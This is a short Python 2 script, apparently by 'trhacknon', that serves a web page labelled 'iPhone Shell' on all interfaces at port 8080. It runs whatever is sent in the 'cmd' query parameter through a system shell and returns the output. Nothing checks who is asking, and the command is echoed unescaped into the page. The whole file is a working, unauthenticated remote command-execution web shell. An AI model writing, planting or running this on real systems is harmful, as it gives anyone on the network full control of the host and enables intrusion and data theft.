#!/usr/bin/env python
# coding: utf-8
import BaseHTTPServer
import urlparse
import subprocess

HOST = '0.0.0.0'
PORT = 8080

class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse.urlparse(self.path)
        query = urlparse.parse_qs(parsed_path.query)
        cmd = query.get('cmd', [''])[0]

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        self.wfile.write("<html><body style='background:black;color:lime;font-family:monospace;'>")
        self.wfile.write("<h2>trhacknon iPhone Shell</h2>")
        self.wfile.write("<form method='GET'>")
        self.wfile.write("💻 Commande : <input name='cmd' style='width:300px' value='%s'/>" % cmd)
        self.wfile.write("<input type='submit' value='Exécuter'/></form><hr>")

        if cmd:
            self.wfile.write("<pre>")
            try:
                output = subprocess.check_output(cmd, shell=True)
                self.wfile.write(output)
            except subprocess.CalledProcessError as e:
                self.wfile.write(str(e))
            self.wfile.write("</pre>")

        self.wfile.write("</body></html>")

def run():
    server_address = (HOST, PORT)
    httpd = BaseHTTPServer.HTTPServer(server_address, RequestHandler)
    print("[*] Serveur WebShell en ligne sur http://%s:%d" % (HOST, PORT))
    httpd.serve_forever()

if __name__ == '__main__':
    run()
